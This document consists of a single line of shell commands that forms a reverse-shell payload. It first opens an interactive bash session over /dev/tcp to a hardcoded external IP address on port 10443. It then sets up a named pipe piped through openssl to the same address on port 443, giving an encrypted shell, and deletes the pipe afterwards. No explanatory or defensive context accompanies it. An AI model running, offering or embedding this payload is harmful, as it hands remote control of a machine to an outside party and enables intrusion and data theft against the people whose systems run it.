/usr/bin/bash -i >& /dev/tcp/45.121.50.235/10443 0>&1;/usr/bin/mkfifo /tmp/s; /usr/bin/bash -i < /tmp/s 2>&1 | /usr/bin/openssl s_client -quiet -connect 45.121.50.235:443 > /tmp/s; /usr/bin/rm /tmp/s
